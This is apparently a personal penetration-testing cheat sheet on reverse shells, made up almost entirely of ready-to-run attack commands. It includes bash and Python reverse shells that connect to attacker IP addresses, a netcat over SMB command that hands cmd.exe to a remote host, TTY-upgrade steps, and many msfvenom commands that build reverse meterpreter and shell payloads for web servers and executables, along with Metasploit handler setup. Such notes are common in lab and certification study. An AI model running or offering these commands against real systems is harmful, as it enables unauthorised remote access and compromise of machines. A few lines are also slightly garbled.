# Shells

## Reverse shells
**Links**

- https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
  https://github.com/Tib3rius/rsg/blob/master/shells.txt
  http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  https://github.com/swisskyrepo/PayloadsAllTheThings
  https://cyb3rdan.com/2019/07/01/oscp/
  https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

## Shells
`/bin/bash -i >& /dev/tcp/10.10.14.20/4444 0>&1`
`bash -i >& /dev/tcp/192.168.32.31/4444 0>&1`
`bash -c 'bash -i >& /dev/tcp/10.10.14.20/4444 0>&1'`
`bash -c help`' for more information about shell builtin commands.
`/bin/sh -i`
`/bin/bash -i`
`echo os.system('/bin/bash')`

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.126",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

`-c` cmd : program passed in as string (terminates option list)

## Getting a shell in limited interpreters:
system("start cmd.exe /k $cmd")
Second shell
After getting a shell, get a second shell with "start" in case the first one bugs up/hangs/crashes (assuming running SMB server): 
victim > start \\10.10.12.84\share\nc.exe -nv -e cmd.exe 10.10.12.84 80



<img src="full shell.png" style="zoom:48%;" />



## Upgrade to full Shell

``` python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
$ stty raw -echo
$ fg and then enter, wait a sec, then reset enter
export TERM=linux
```


## Msfvenom

https://www.offensive-security.com/metasploit-unleashed/Msfvenom/
https://netsec.ws/?p=331

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.56 LPORT=8888 -f raw > shell.jsp
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.0.126 LPORT=53 -f elf -o shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.126 LPORT=4444 -f exe -o shell_reverse.exe
msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python

msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_ip> -o meterpreter.php
msfvenom -p generic/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f php -o shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=attackerPort -f aspx > shell.aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=attackerPort -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.126 LPORT=4444 -f war > shell.war
```

`-p` = payload\
`-f` = output format\
`-o` = out\
`-a` = architecture\
`-e` = encoder\
`-i` = iterations of encoder\
`-b` = bad characters to avoid \x00\xff\
`--platform` = platform for the payload\



## Multi/Handler

```shell
set payload ...
set LPORT
set LHOST
exploit
```

**Create small shellcode**
`msfvenom -p windows/shell_reverse_tcp -a x86 -f python –platform windows LHOST=<ip> LPORT=443 -b “\x00” EXITFUNC=thread –smallest -e x86/fnstenv_mov`